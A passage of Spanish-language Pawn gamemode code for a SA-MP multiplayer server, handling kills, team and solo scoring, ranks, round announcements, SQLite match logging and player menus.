	if(configuracionMundo[GetPlayerVirtualWorld(playerid)][enJuego]){
	    if(Equipo[playerid] != EQUIPO_ESPECTADOR)
			darArmas(playerid);
	}else
	    darArmas(playerid);

 	SetPlayerFacingAngle(playerid, 180);
	SetPlayerPos(playerid, posicionesMapas[mapaJugador(playerid)][Equipo[playerid]][0], posicionesMapas[mapaJugador(playerid)][Equipo[playerid]][1], posicionesMapas[mapaJugador(playerid)][Equipo[playerid]][2]);
	SetCameraBehindPlayer(playerid);
	SetPlayerHealth(playerid, 100);
	return 1;
}

public OnPlayerDeath(playerid, killerid, reason)
{
    if(killerid == INVALID_PLAYER_ID)
		return 1;

	if(estaEnDuelo(playerid) && estaEnDuelo(killerid))
	    return terminarDuelo(playerid, killerid);

	if(Equipo[playerid] != EQUIPO_ESPECTADOR && Equipo[killerid] != EQUIPO_ESPECTADOR){
		if(Equipo[playerid] != NULO && Equipo[killerid] != NULO)
			if(configuracionMundo[GetPlayerVirtualWorld(playerid)][enJuego])
				actualizarPuntajes(playerid, killerid, GetPlayerVirtualWorld(playerid));
	}
	if(Equipo[playerid] != EQUIPO_ESPECTADOR && Equipo[killerid] != EQUIPO_ESPECTADOR)
		enviarMensajeDeMuerte(GetPlayerVirtualWorld(playerid), playerid, killerid, reason);

	SpawnPlayer(playerid);
   	return 1;
}

stock enviarMensajeDeMuerte(numeroMundo, killerid, playerid, reason){
	ForPlayers(i)
		if(GetPlayerVirtualWorld(i) == numeroMundo)
			SendDeathMessageToPlayer(i, playerid, killerid, reason);
}

stock actualizarPuntajes(playerid, killerid, numeroMundo){
	
	if(configuracionMundo[numeroMundo][tipoPartida] == UNO_VS_UNO)
		actualizarEnSolo(playerid, killerid, numeroMundo);
	else if(configuracionMundo[numeroMundo][tipoPartida] == EN_EQUIPO)
		actualizarEnEquipo(playerid, killerid, numeroMundo);
	
}

stock actualizarEnEquipo(playerid, killerid, numeroMundo){

	if(Equipo[playerid] == Equipo[killerid]){
		anunciarTeamKill(playerid, killerid, numeroMundo);
		switch(Equipo[playerid]){
			case EQUIPO_NARANJA:
			{
				configuracionMundo[numeroMundo][puntajeVerde]++;
				configuracionMundo[numeroMundo][puntajeTotalVerde]++;
			}
			case EQUIPO_VERDE:
			{
				configuracionMundo[numeroMundo][puntajeNaranja]++;
				configuracionMundo[numeroMundo][puntajeTotalNaranja]++;
			}
		}
	}else{
		switch(Equipo[killerid]){
			case EQUIPO_NARANJA:
			{
				configuracionMundo[numeroMundo][puntajeNaranja]++;
				configuracionMundo[numeroMundo][puntajeTotalNaranja]++;
			}
			case EQUIPO_VERDE:
			{
				configuracionMundo[numeroMundo][puntajeVerde]++;
				configuracionMundo[numeroMundo][puntajeTotalVerde]++;
			}
		
		}
	}

	new rondaMax = configuracionMundo[numeroMundo][rondaMaxima],
		rondaNaranja = configuracionMundo[numeroMundo][rondasNaranja],
		rondaVerde = configuracionMundo[numeroMundo][rondasVerde],
		puntajeMax = configuracionMundo[numeroMundo][puntajeMaximo],
		puntosNaranja = configuracionMundo[numeroMundo][puntajeNaranja],
		puntosVerde = configuracionMundo[numeroMundo][puntajeVerde];

	switch(Equipo[killerid]){
		case EQUIPO_NARANJA:
		{
			if(puntosNaranja == puntajeMax){
				if(rondaNaranja == rondaMax-1){
					configuracionMundo[numeroMundo][rondasNaranja]++;
					anunciarEquipoGanadorPartida(numeroMundo, Equipo[killerid]);
					establecerPuntosObtenidosEquipo(numeroMundo, Equipo[killerid], Equipo[playerid]);
				}else{
					anunciarEquipoGanadorRonda(numeroMundo, Equipo[killerid]);
					configuracionMundo[numeroMundo][rondasNaranja]++;
					anunciarInicioRonda(numeroMundo);
					resetearPuntaje(numeroMundo);
					respawnearJugadores(numeroMundo);
				}
			}
		}
		case EQUIPO_VERDE:
		{
			if(puntosVerde == puntajeMax){
				if(rondaVerde == rondaMax-1){
					configuracionMundo[numeroMundo][rondasVerde]++;
					anunciarEquipoGanadorPartida(numeroMundo, Equipo[killerid]);
					establecerPuntosObtenidosEquipo(numeroMundo, Equipo[killerid], Equipo[playerid]);
				}else{
					anunciarEquipoGanadorRonda(numeroMundo, Equipo[killerid]);
					configuracionMundo[numeroMundo][rondasVerde]++;
					anunciarInicioRonda(numeroMundo);
					resetearPuntaje(numeroMundo);
					respawnearJugadores(numeroMundo);
				}
			}
		}
	}
	actualizarMarcador(numeroMundo);
	actualizarDrawPartida(numeroMundo);
}

stock anunciarTeamKill(playerid, killerid, numeroMundo){
	new Texto[400];
	format(Texto, sizeof(Texto), "[MUNDO %d] {%06x}%s {C9C9C9}ha matado a alguien de su propio equipo: {%06x}%s{C9C9C9} ({FFFFFF}-1 {C9C9C9}punto al otro equipo).",
	numeroMundo, colorJugador(killerid), obtenerNick(killerid), colorJugador(playerid), obtenerNick(playerid));
    enviarATodos(numeroMundo, Texto);	
}

stock anunciarEquipoGanadorPartida(numeroMundo, idEquipo){
	new Texto[300], textoTiempo[300], textoDatos[300];

	switch(idEquipo){
		case EQUIPO_NARANJA: format(Texto, sizeof(Texto), "[MUNDO %d] El equipo {F69521}Naranja {C9C9C9}ha ganado la partida.", numeroMundo);
		case EQUIPO_VERDE: format(Texto, sizeof(Texto), "[MUNDO %d] El equipo {007C0E}Verde {C9C9C9}ha ganado la partida.", numeroMundo);
	}
	enviarATodos(numeroMundo, Texto);

	format(textoDatos, sizeof(textoDatos), "[MUNDO %d] Puntaje total: {F69521}%d {C9C9C9}- {007C0E}%d {C9C9C9}| Rondas ganadas: {F69521}%d {C9C9C9}- {007C0E}%d",
	numeroMundo, configuracionMundo[numeroMundo][puntajeTotalNaranja], configuracionMundo[numeroMundo][puntajeTotalVerde], configuracionMundo[numeroMundo][rondasNaranja], configuracionMundo[numeroMundo][rondasVerde]);
	enviarATodos(numeroMundo, textoDatos);
	
	format(textoTiempo, sizeof(textoTiempo), "[MUNDO %d] La partida durÛ {FFFFFF}%d {C9C9C9}minuto/s con {FFFFFF}%d {C9C9C9}segundo/s.",
	numeroMundo, configuracionMundo[numeroMundo][Minutos], configuracionMundo[numeroMundo][Segundos]);
    enviarATodos(numeroMundo, textoTiempo);
	respawnearJugadores(numeroMundo);
	guardarDatosJugadores(numeroMundo);
	resetearTodo(numeroMundo);
}


stock anunciarEquipoGanadorRonda(numeroMundo, idEquipo){
	new Texto[300], str[200], textoTiempo[300];

	switch(idEquipo){
		case EQUIPO_NARANJA: format(Texto, sizeof(Texto), "[MUNDO %d] El equipo {F69521}Naranja ", numeroMundo);
		case EQUIPO_VERDE: format(Texto, sizeof(Texto), "[MUNDO %d] El equipo {007C0E}Verde ", numeroMundo);
	}

	strcat(Texto, str);
	format(str, sizeof(str), "{C9C9C9}ha ganado la {FFFFFF}%d {C9C9C9}ronda.", configuracionMundo[numeroMundo][rondaActual]);
	strcat(Texto, str);
	enviarATodos(numeroMundo, Texto);

	format(textoTiempo, sizeof(textoTiempo), "[MUNDO %d] La ronda durÛ {FFFFFF}%d {C9C9C9}minuto/s con {FFFFFF}%d {C9C9C9}segundo/s.",
	numeroMundo, configuracionMundo[numeroMundo][Minutos], configuracionMundo[numeroMundo][Segundos]);
    enviarATodos(numeroMundo, textoTiempo);

	configuracionMundo[numeroMundo][rondaActual]++;
}

stock borrarLogMuertes(){
   for(new l=0; l<6; l++) SendDeathMessage(202, 202, 202);
}


stock actualizarEnSolo(playerid, killerid, numeroMundo){

	if(Equipo[killerid] == EQUIPO_NARANJA){
		configuracionMundo[numeroMundo][puntajeNaranja]++;
		configuracionMundo[numeroMundo][puntajeTotalNaranja]++;
	}else{
		configuracionMundo[numeroMundo][puntajeVerde]++;
		configuracionMundo[numeroMundo][puntajeTotalVerde]++;
	}

	actualizarMarcador(numeroMundo);
	actualizarDrawPartida(numeroMundo);

	new rondaMax = configuracionMundo[numeroMundo][rondaMaxima],
		rondaNaranja = configuracionMundo[numeroMundo][rondasNaranja],
		rondaVerde = configuracionMundo[numeroMundo][rondasVerde],
		puntajeMax = configuracionMundo[numeroMundo][puntajeMaximo],
		puntosNaranja = configuracionMundo[numeroMundo][puntajeNaranja],
		puntosVerde = configuracionMundo[numeroMundo][puntajeVerde];
	
	switch(Equipo[killerid]){

		case EQUIPO_NARANJA:
		{
			if(puntosNaranja == puntajeMax){
				if(rondaNaranja == rondaMax-1){
					configuracionMundo[numeroMundo][rondasNaranja]++;
					anunciarGanadorPartida(numeroMundo, playerid, killerid);
				}else{
					anunciarGanadorRonda(numeroMundo, playerid, killerid);
					configuracionMundo[numeroMundo][rondasNaranja]++;
					anunciarInicioRonda(numeroMundo);
					resetearPuntaje(numeroMundo);
					respawnearJugadores(numeroMundo);
				}
			}
		}
		case EQUIPO_VERDE:
		{
			if(puntosVerde == puntajeMax){
				if(rondaVerde == rondaMax-1){
					configuracionMundo[numeroMundo][rondasVerde]++;
					anunciarGanadorPartida(numeroMundo, playerid, killerid);
					establecerPuntosObtenidos(killerid, playerid);
				}else{
					anunciarGanadorRonda(numeroMundo, playerid, killerid);
					configuracionMundo[numeroMundo][rondasVerde]++;
					anunciarInicioRonda(numeroMundo);
					resetearPuntaje(numeroMundo);
					respawnearJugadores(numeroMundo);
				}
			}
		}
	}

	actualizarMarcador(numeroMundo);
	actualizarDrawPartida(numeroMundo);
	return 1;
}

stock establecerPuntosObtenidosEquipo(numeroMundo, equipoGanador, equipoPerdedor){
	sumarPuntajeJugadores(numeroMundo, equipoGanador);
	restarPuntajeJugadores(numeroMundo, equipoPerdedor);
}

stock sumarPuntajeJugadores(numeroMundo, equipo){
	ForPlayers(i){
		if(GetPlayerVirtualWorld(i) == numeroMundo && Equipo[i] == equipo){
			Jugador[i][puntajeEquipo] += 12;
			SendClientMessage(i, COLOR_NEUTRO, "> Se te sumÛ {FFFFFF}+12 {C9C9C9}por tu victoria en equipo.");
		}
	}
}

stock restarPuntajeJugadores(numeroMundo, equipo){
	ForPlayers(i){
		if(GetPlayerVirtualWorld(i) == numeroMundo && Equipo[i] == equipo){
			if((Jugador[i][puntajeEquipo] - 10) <= 0){
				Jugador[i][puntajeEquipo] = 0;
				SendClientMessage(i, COLOR_NEUTRO, "> No se te restÛ puntos porque tienes {FFFFFF}0{C9C9C9}.");
			}else{
				Jugador[i][puntajeEquipo] -= 10;
				SendClientMessage(i, COLOR_NEUTRO, "> Se te restÛ {FFFFFF}-10 {C9C9C9}por la derrota en equipo.");
			}
		}
	}
}

stock establecerPuntosObtenidos(ganador, perdedor){
	new rangoGanador = obtenerRango(ganador, UNO_VS_UNO),
		rangoPerdedor = obtenerRango(perdedor,  UNO_VS_UNO),
		puntosGanador = 0,
		puntosPerdedor = 0;

	if(rangoGanador == rangoPerdedor){
 		puntosGanador = 22;
	    puntosPerdedor = 20;
	}else if(rangoGanador > rangoPerdedor){
	    puntosGanador = 12;
	    puntosPerdedor = 10;
	}else if(rangoGanador < rangoPerdedor){
	    puntosGanador = 18;
	    puntosPerdedor = 15;
	}

	if((Jugador[perdedor][puntajeSolo] - puntosPerdedor) < 0)
		Jugador[perdedor][puntajeSolo] = 0;
	else
		Jugador[perdedor][puntajeSolo] -= puntosPerdedor;

	Jugador[ganador][puntajeSolo] += puntosGanador;

	new txtGanador[200], txtPerdedor[200];
 	format(txtGanador, sizeof(txtGanador), "Se te sumÛ {FFFFFF}+%d {C9C9C9}puntos por tu victoria ({FFFFFF}%d{C9C9C9} total).", puntosGanador, Jugador[ganador][puntajeSolo]);
 	SendClientMessage(ganador, COLOR_NEUTRO, txtGanador);

 	if(Jugador[perdedor][puntajeSolo] == 0)
        format(txtPerdedor, sizeof(txtPerdedor), "No se te restÛ puntos porque tienes {FFFFFF}%d{C9C9C9} puntos.", Jugador[perdedor][puntajeSolo]);
 	else
 	    format(txtPerdedor, sizeof(txtPerdedor), "Se te restÛ {FFFFFF}-%d {C9C9C9}puntos por tu derrota ({FFFFFF}%d{C9C9C9})", puntosPerdedor, Jugador[perdedor][puntajeSolo]);
 	SendClientMessage(perdedor, COLOR_NEUTRO, txtPerdedor);

	SetPlayerScore(ganador, Jugador[ganador][puntajeSolo] + Jugador[ganador][puntajeEquipo]);
	SetPlayerScore(perdedor, Jugador[perdedor][puntajeSolo] + Jugador[ganador][puntajeEquipo]);

    CallLocalFunction("guardarDatos", "i", ganador);
    CallLocalFunction("guardarDatos", "i", perdedor);
}

stock obtenerRango(playerid, categoria){
	new RANGO, puntos = 0;
	switch(categoria)
	{
		case UNO_VS_UNO: puntos = Jugador[playerid][puntajeSolo];
		case EN_EQUIPO: puntos = Jugador[playerid][puntajeEquipo];
	}

	if(puntos >= 0 && puntos < 80) RANGO = SIN_RANGO;
	if(puntos >= 80 && puntos < 200) RANGO = RANGO_JUNIOR;
	if(puntos >= 200 && puntos < 400) RANGO = RANGO_ASESINO;
	if(puntos >= 400 && puntos < 600) RANGO = RANGO_MERCENARIO;
	if(puntos >= 600 && puntos < 800) RANGO = RANGO_ELITE;
	if(puntos >= 800 && puntos < 1000) RANGO = RANGO_LEYENDA;
	if(puntos >= 1000 && puntos < 1200) RANGO = RANGO_MAESTRO;
	if(puntos >= 1200) RANGO = RANGO_SENIOR;
	return RANGO;
}

stock nombreRango(playerid){
	new s[24], RANGO = obtenerRango(playerid, UNO_VS_UNO);
	if(RANGO == SIN_RANGO)
		format(s, 24, "Sin rango");
	if(RANGO == RANGO_JUNIOR)
	    format(s, 24, "Junior");
	if(RANGO == RANGO_ASESINO)
	    format(s, 24, "Asesino");
	if(RANGO == RANGO_MERCENARIO)
	    format(s, 24, "Mercenario");
	if(RANGO == RANGO_ELITE)
	    format(s, 24, "Elite");
	if(RANGO == RANGO_LEYENDA)
	    format(s, 24, "Leyenda");
	if(RANGO == RANGO_SENIOR)
	    format(s, 24, "Senior");
	if(RANGO == RANGO_MAESTRO)
	    format(s, 24, "Maestro");
	return s;
}

stock colorRango(playerid){
	new s[9], RANGO = obtenerRango(playerid, UNO_VS_UNO);
	if(RANGO == SIN_RANGO)
		format(s, 9, "FFFFFF");
	if(RANGO == RANGO_JUNIOR)
	    format(s, 9, "BA7600");
	if(RANGO == RANGO_ASESINO)
	    format(s, 9, "BDBDBD");
	if(RANGO == RANGO_MERCENARIO)
	    format(s, 9, "FFD900");
	if(RANGO == RANGO_ELITE)
	    format(s, 9, "00AEBA");
	if(RANGO == RANGO_LEYENDA)
	    format(s, 9, "00EFFF");
	if(RANGO == RANGO_SENIOR)
	    format(s, 9, "00F576");
	if(RANGO == RANGO_MAESTRO)
	    format(s, 9, "FF0084");
	return s;
}

stock anunciarGanadorPartida(numeroMundo, playerid, killerid){
	new textoDatos[700], textoTiempo[200], textoFinal[300];
	
	format(textoFinal, sizeof(textoFinal), "[MUNDO %d] {%06x}%s {C9C9C9}ha ganado la partida contra {%06x}%s{C9C9C9}.",
	numeroMundo, colorJugador(killerid), obtenerNick(killerid), colorJugador(playerid), obtenerNick(playerid));
    enviarATodos(numeroMundo, textoFinal);

	format(textoDatos, sizeof(textoDatos), "[MUNDO %d] Puntaje total: {F69521}%d {C9C9C9}- {007C0E}%d {C9C9C9}| Rondas ganadas: {F69521}%d {C9C9C9}- {007C0E}%d", 
	numeroMundo, configuracionMundo[numeroMundo][puntajeTotalNaranja], configuracionMundo[numeroMundo][puntajeTotalVerde], configuracionMundo[numeroMundo][rondasNaranja], configuracionMundo[numeroMundo][rondasVerde]);
	enviarATodos(numeroMundo, textoDatos);

	registrarPartidaSolo(numeroMundo, obtenerNick(killerid));
		
	format(textoTiempo, sizeof(textoTiempo), "[MUNDO %d] La partida durÛ {FFFFFF}%d {C9C9C9}minuto/s con {FFFFFF}%d {C9C9C9}segundo/s.",
	numeroMundo, configuracionMundo[numeroMundo][Minutos], configuracionMundo[numeroMundo][Segundos]);
    enviarATodos(numeroMundo, textoTiempo);

	respawnearJugadores(numeroMundo);
	resetearTodo(numeroMundo);
	borrarLogMuertes();
}

stock registrarPartidaSolo(numeroMundo, ganador[]){
   	new Consulta[2000], str[300], diaActual, mesActual, yearActual;
   	getdate(yearActual, mesActual, diaActual);

	new naranja = jugadorNaranja(numeroMundo), verde = jugadorVerde(numeroMundo);

    format(Consulta, sizeof(Consulta), "INSERT INTO partidasSolo (jugadorNaranja, jugadorVerde, Ganador, puntajeNaranja, rondasNaranja, puntajeVerde, rondasVerde, Year, Mes, Dia, ");
    format(str, sizeof(str), "minutosJugados, segundosJugados) VALUES ");
	strcat(Consulta, str);
    format(str, sizeof(str), "('%s',", obtenerNick(naranja));									strcat(Consulta, str);
    format(str, sizeof(str), "'%s',", obtenerNick(verde));										strcat(Consulta, str);
    format(str, sizeof(str), "'%s',", ganador);													strcat(Consulta, str);
    format(str, sizeof(str), "%d,", configuracionMundo[numeroMundo][puntajeTotalNaranja]);		strcat(Consulta, str);
    format(str, sizeof(str), "%d,", configuracionMundo[numeroMundo][rondasNaranja]);			strcat(Consulta, str);
    format(str, sizeof(str), "%d,", configuracionMundo[numeroMundo][puntajeTotalVerde]);		strcat(Consulta, str);
    format(str, sizeof(str), "%d,", configuracionMundo[numeroMundo][rondasVerde]);				strcat(Consulta, str);
    format(str, sizeof(str), "%d,", yearActual);												strcat(Consulta, str);
	format(str, sizeof(str), "%d,", mesActual);													strcat(Consulta, str);
   	format(str, sizeof(str), "%d,", diaActual);													strcat(Consulta, str);
   	format(str, sizeof(str), "%d,", configuracionMundo[numeroMundo][Minutos]);					strcat(Consulta, str);
   	format(str, sizeof(str), "%d)", configuracionMundo[numeroMundo][Segundos]);					strcat(Consulta, str);
   	db_query(partidasSolo, Consulta);
	return 1;
}

stock contarPartidasRealizadas(tipo){
	new DBResult:resultado, total = 0;
	switch(tipo)
	{
		case UNO_VS_UNO:
		{
			resultado = db_query(partidasSolo, "SELECT count(id) as 'Total' from partidasSolo");
			if(db_num_rows(resultado))
				total = db_get_field_assoc_int(resultado, "Total");
			db_free_result(resultado);
		}
	}
	return total;
}

stock mostrarPartidasRealizadasSolo(playerid, offset){
	new selece[2000], string[128];
	new DBResult:resultado, numero, naranja[24], verde[24], Ganador[24], mes, dia, year, m, s;

	new ministr[200];
	format(ministr, sizeof(ministr), "SELECT * FROM partidasSolo ORDER BY id LIMIT 10 OFFSET %d", offset-10);
    resultado = db_query(partidasSolo, ministr);

    if(db_num_rows(resultado)){
        strcat(selece, "{7C7C7C}N˙mero\t{7C7C7C}Jugadores\t{7C7C7C}Ganador\t{7C7C7C}Fecha y duraciÛn");
		do{
		    numero = db_get_field_assoc_int(resultado, "id");
		    db_get_field_assoc(resultado, "jugadorNaranja", naranja, sizeof(naranja));
		    db_get_field_assoc(resultado, "jugadorVerde", verde, sizeof(verde));
		    db_get_field_assoc(resultado, "Ganador", Ganador, sizeof(Ganador));
		    mes = db_get_field_assoc_int(resultado, "Mes");
		    dia = db_get_field_assoc_int(resultado, "Dia");
		    year = db_get_field_assoc_int(resultado, "Year");
			m = db_get_field_assoc_int(resultado, "minutosJugados");
		    s = db_get_field_assoc_int(resultado, "segundosJugados");
			format(string, sizeof(string), "\n{7C7C7C}%d\t{F69521}%s {7C7C7C}vs {007C0E}%s\t{FFFFFF}%s\t{FFFFFF}%d/%d/%d - %dm%ds", numero, naranja, verde, Ganador, dia, mes, year, m, s);
			strcat(selece, string);
		}while(db_next_row(resultado));
		db_free_result(resultado);
		ShowPlayerDialog(playerid, PARTIDAS_REALIZADAS_SOLO, DIALOG_STYLE_TABLIST_HEADERS, "{7C7C7C}Partidas realizadas", selece, "Sig.", "X");
	}else{
	    Jugador[playerid][Offset] = 0;
	    ShowPlayerDialog(playerid, PARTIDAS_REALIZADAS_SOLO, DIALOG_STYLE_TABLIST_HEADERS, "{7C7C7C}Partidas realizadas", "No hay partidas para mostrar" , "Volver", "Cerrar");
	}
	return 1;
}

stock mostrarPartidasRealizadas(playerid){
	new Dialogo[1000], string[300];
 	strcat(Dialogo, "{7C7C7C}Tipo\t{7C7C7C}InformaciÛn\n");
	format(string, sizeof(string), "\n{7C7C7C}Solo\t%d partidas terminadas", contarPartidasRealizadas(UNO_VS_UNO));	strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}En equipo\tTodavia no disponible");									strcat(Dialogo, string);
	return ShowPlayerDialog(playerid, PARTIDAS_REALIZADAS, DIALOG_STYLE_TABLIST_HEADERS, "{7C7C7C}Partidas realizadas", Dialogo, ">>", "Salir");
}

CMD:partidas(playerid, params[]){
	return mostrarPartidasRealizadas(playerid);
}

stock anunciarInicioRonda(numeroMundo){
	new Texto[500];
	format(Texto, sizeof(Texto), "[MUNDO %d] {C9C9C9}Comienza la {FFFFFF}%d {C9C9C9}ronda.", 
	numeroMundo, configuracionMundo[numeroMundo][rondaActual]);
	enviarATodos(numeroMundo, Texto);
	borrarLogMuertes();
}

stock anunciarGanadorRonda(numeroMundo, playerid, killerid){
 	new Texto[500], textoTiempo[300];
	format(Texto, sizeof(Texto), "[MUNDO %d] {%06x}%s {C9C9C9}ha ganado la {FFFFFF}%d {C9C9C9}ronda contra {%06x}%s{C9C9C9}.",
	numeroMundo, colorJugador(killerid), obtenerNick(killerid), configuracionMundo[numeroMundo][rondaActual], colorJugador(playerid), obtenerNick(playerid));
	configuracionMundo[numeroMundo][rondaActual]++;
	enviarATodos(numeroMundo, Texto);

	format(textoTiempo, sizeof(textoTiempo), "[MUNDO %d] La ronda durÛ {FFFFFF}%d {C9C9C9}minuto/s con {FFFFFF}%d {C9C9C9}segundo/s.",
	numeroMundo, configuracionMundo[numeroMundo][Minutos], configuracionMundo[numeroMundo][Segundos]);
    enviarATodos(numeroMundo, textoTiempo);
	borrarLogMuertes();
}

public OnPlayerTakeDamage(playerid, issuerid, Float: amount, weaponid, bodypart)
{
    if(issuerid != INVALID_PLAYER_ID){
		if(Jugador[issuerid][sonidoCampana])
			PlayerPlaySound(issuerid, Jugador[issuerid][tipoCampana], 0.0, 0.0, 0.0);
	}

	if(Jugador[playerid][vidaInfinita]){
		SetPlayerHealth(playerid, 100);
		SendClientMessage(issuerid, COLOR_NEUTRO, "> Ese jugador tiene activado la vida infinita.");
	}

	if(Equipo[playerid] != EQUIPO_ESPECTADOR && Equipo[issuerid] == EQUIPO_ESPECTADOR){
		Jugador[issuerid][Adversion]++;
		new str[500];
		format(str, sizeof(str), "{FFFFFF}[WTx][L]eChe[R]Oo_. {C9C9C9}ha advertido a {%06x}%s{C9C9C9} (%d/3): {FFFFFF}no dispares a los jugadores pendejo",
		colorJugador(issuerid), Jugador[issuerid][Nombre], Jugador[issuerid][Adversion]);
		enviarATodos(GetPlayerVirtualWorld(playerid), str);
		verificarAdvertencias(issuerid);
	}

	if(Jugador[playerid][infoDamage] == 1)
		mostrarDrawHitReceptor(playerid, issuerid, amount);
		
	if(Jugador[issuerid][infoDamage] == 1)
		mostrarDrawHitEmisor(playerid, issuerid, amount);

    return 1;
}

public OnPlayerGiveDamage(playerid, damagedid, Float: amount, weaponid, bodypart)
{
	

    return 1;
}

stock mostrarDrawHitReceptor(playerid, issuerid, Float: cantidad){
	new str[200];
	if(segundosTotalesHit[playerid][1] != -1){
		segundosTotalesHit[playerid][1] = -1;
		KillTimer(delayDrawHit[playerid][1]);
		PlayerTextDrawHide(playerid, drawHit[playerid][1]);
	}
	format(str, sizeof(str), "~w~Recibiste  ~r~-%.2f ~w~de ~g~%s", cantidad, obtenerNick(issuerid));
	PlayerTextDrawSetString(playerid, drawHit[playerid][1], str);
	PlayerTextDrawShow(playerid, drawHit[playerid][1]);
	segundosTotalesHit[playerid][1] = 2;
	delayDrawHit[playerid][1] = SetTimerEx("restarDelayHitReceptor", 1000, true, "i", playerid);
}


public restarDelayHitReceptor(playerid){
	segundosTotalesHit[playerid][1]--;
	if(segundosTotalesHit[playerid][1] == 0){
	    PlayerTextDrawHide(playerid, drawHit[playerid][1]);
		segundosTotalesHit[playerid][1] = -1;
	    KillTimer(delayDrawHit[playerid][1]);
	}
}

public restarDelayHitEmisor(playerid){
	segundosTotalesHit[playerid][0]--;
	if(segundosTotalesHit[playerid][0] == 0){
		PlayerTextDrawHide(playerid, drawHit[playerid][0]);
		segundosTotalesHit[playerid][0] = -1;
	    KillTimer(delayDrawHit[playerid][0]);
	}
}

stock mostrarDrawHitEmisor(playerid, issuerid, Float: cantidad){
	new str[200];
	if(segundosTotalesHit[issuerid][0] != -1){
		segundosTotalesHit[issuerid][0] = -1;
		KillTimer(delayDrawHit[issuerid][0]);
		PlayerTextDrawHide(issuerid, drawHit[issuerid][0]);
	}
	format(str, sizeof(str), "~w~Diste ~r~-%.2f ~w~ a ~g~%s", cantidad, obtenerNick(playerid));
	PlayerTextDrawSetString(issuerid, drawHit[issuerid][0], str);
	PlayerTextDrawShow(issuerid, drawHit[issuerid][0]);
	segundosTotalesHit[issuerid][0] = 2;
	delayDrawHit[issuerid][0] = SetTimerEx("restarDelayHitEmisor", 1000, true, "i", issuerid);
}

public obtenerPais(playerid, response_code, data[])
{
    new buffer[358];
    if(response_code == 200){
        new str[230], nombrePais[128];
        format(buffer, sizeof(buffer), "%s", data);
        strmid(str, buffer, 4, strlen(buffer));
		if(!strcmp(obtenerIp(playerid), "127.0.0.1"))
			format(nombrePais, sizeof(nombrePais), "localhost");
		else
			strmid(nombrePais, str, strfind(str, ";", true) + 4, strlen(buffer));
        format(str, sizeof(str), "> {FFFFFF}%s {C9C9C9}se conectÛ al servidor ({FFFFFF}%s{C9C9C9}).", obtenerNick(playerid), nombrePais);
        SendClientMessageToAll(COLOR_NEUTRO, str);
		format(Jugador[playerid][Pais], 64, nombrePais);
    }else{
        #if defined SIEMPRE_RESPONDER
        new str[300];
        format(str, sizeof(str),"api.ipinfodb.com/v3/ip-country/?key=%s&ip=%s", APIKEY, obtenerIp(playerid));
        HTTP(playerid, HTTP_GET, str, "", "obtenerPais");
        #else
		new tEntrada[100];
	 	format(tEntrada, sizeof(tEntrada), "> {FFFFFF}%s {C9C9C9}se conectÛ al servidor.", obtenerNick(playerid));
		SendClientMessageToAll(COLOR_NEUTRO, tEntrada);
        #endif
    }
}

stock mostrarMenuMundos(playerid){
	if(GetPlayerVirtualWorld(playerid) != 200){
		ocultarDatosPartida(playerid);
 	}
 	SetPlayerInterior(playerid, 0);
	SetPlayerVirtualWorld(playerid, 0);
	if(!Jugador[playerid][eligiendoMundo])
		Jugador[playerid][eligiendoMundo] = true;
	new Dialogo[1000], string[254];
 	strcat(Dialogo, "{7C7C7C}n˙mero\t{7C7C7C}InformaciÛn\n");
	format(string, sizeof(string), "\n{7C7C7C}Mundo 1\t%s", informacionMundo(1));	strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Mundo 2\t%s", informacionMundo(2));	strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Mundo 3\t%s", informacionMundo(3));	strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Mundo 4\t%s", informacionMundo(4));	strcat(Dialogo, string);
	return ShowPlayerDialog(playerid, D_MENU_MUNDOS, DIALOG_STYLE_TABLIST_HEADERS, "{7C7C7C}Elije el mundo virtual", Dialogo, ">>", "");
}

stock totalJugadores(numeroMundo){
	return configuracionMundo[numeroMundo][jugadoresNaranja] + configuracionMundo[numeroMundo][jugadoresVerde] + configuracionMundo[numeroMundo][cantidadEspectadores];
}

stock informacionMundo(numeroMundo){
	new Info[1000];
	format(Info, sizeof(Info), "{FFFFFF}%s{7C7C7C} con {FFFFFF}%d {7C7C7C}jugadores totales", nombrePartida(configuracionMundo[numeroMundo][tipoPartida]), totalJugadores(numeroMundo));
	return Info;
}

stock mostrarMenuEquipos(playerid){
	new Dialogo[1000], string[254], Titulo[70], numeroMundo = GetPlayerVirtualWorld(playerid);
	format(Titulo, sizeof(Titulo), "{7C7C7C}Mundo %d: %s", numeroMundo, nombreMapa(configuracionMundo[numeroMundo][Mapa]));
	
	if(configuracionMundo[numeroMundo][equiposBloqueados])
	    strcat(Titulo, "{7C7C7C}, equipos {FF0000}bloqueados");

	strcat(Dialogo, "{7C7C7C}Equipo\t{7C7C7C}Jugadores\n");
	format(string, sizeof(string), "\n{F69521}Naranja\t{FFFFFF}%d", configuracionMundo[numeroMundo][jugadoresNaranja]);		strcat(Dialogo, string);
	format(string, sizeof(string), "\n{007C0E}Verde\t{FFFFFF}%d", configuracionMundo[numeroMundo][jugadoresVerde]);			strcat(Dialogo, string);
	format(string, sizeof(string), "\n{FFFFFF}Espectador\t%d", configuracionMundo[numeroMundo][cantidadEspectadores]);		strcat(Dialogo, string);
	return ShowPlayerDialog(playerid, D_MENU_EQUIPOS, DIALOG_STYLE_TABLIST_HEADERS, Titulo, Dialogo, ">>", "X");
}

stock nombreMapa(numeroMapa){
	new str[30];
	if(numeroMapa == 0) format(str, sizeof(str), "Aeropuerto LV");
	if(numeroMapa == 1) format(str, sizeof(str), "Aeropuerto SF");
	if(numeroMapa == 2) format(str, sizeof(str), "Auto-escuela");
	return str;
}

stock nombrePartida(numero){
	new str[60];
	if(numero == ENTRENAMIENTO) format(str, sizeof(str), "Entrenamiento");
	if(numero == EN_EQUIPO) format(str, sizeof(str), "En Equipo");
	if(numero == UNO_VS_UNO) format(str, sizeof(str), "Uno vs Uno");
	return str;
}

stock configurarDrawFpsPing(playerid){
	mostrarFps[playerid] = CreatePlayerTextDraw(playerid, 500, 8, "Fps: 102");
	PlayerTextDrawLetterSize(playerid, mostrarFps[playerid], 0.200000, 1.000000);
	PlayerTextDrawAlignment(playerid, mostrarFps[playerid], 1);
	PlayerTextDrawColor(playerid, mostrarFps[playerid], -1);
	PlayerTextDrawSetShadow(playerid, mostrarFps[playerid], 0);
	PlayerTextDrawSetOutline(playerid, mostrarFps[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, mostrarFps[playerid], 51);
